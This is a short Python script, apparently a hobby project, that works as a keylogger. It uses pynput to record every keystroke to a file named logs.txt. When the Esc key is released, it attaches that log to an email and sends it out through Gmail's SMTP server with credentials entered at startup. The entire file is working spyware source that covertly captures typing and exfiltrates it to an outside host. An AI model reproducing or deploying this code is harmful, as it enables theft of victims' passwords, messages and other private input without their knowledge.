import pynput
import os
import socket
import smtplib
from pynput.keyboard import Key,Listener
from email.message import EmailMessage



sender=input('Enter the email address of sender:')
password=input('Enter the password of sender:')
reciever=input('Enter the email of the reciever')
msg=EmailMessage()
msg['Subject']="this is subject "
msg['From']=sender
msg['To']=reciever
msg.set_content("this is the main mail")

nok=0
keys=[]


def on_press(key):
    global keys,nok
    keys.append(key)
    nok+=1
        
    if nok>=10:
        nok=0
        write_file(keys)
        keys=[]
        keys.clear()

def write_file(keys):
    with open("logs.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 1:
                f.write('\n')
            elif k.find("Key") == -1: 
                f.write(k)











def on_release(key):
    if key==Key.esc:
        with open("logs.txt",'rb') as f:
            file_data=f.read()
            file_name=f.name
            msg.add_attachment(file_data,maintype='application',subtype='octet-stream',filename=file_name)
            with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
        
                smtp.login(sender,password)

                smtp.send_message(msg)
        return False


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()              #constantly running the loop till we break out













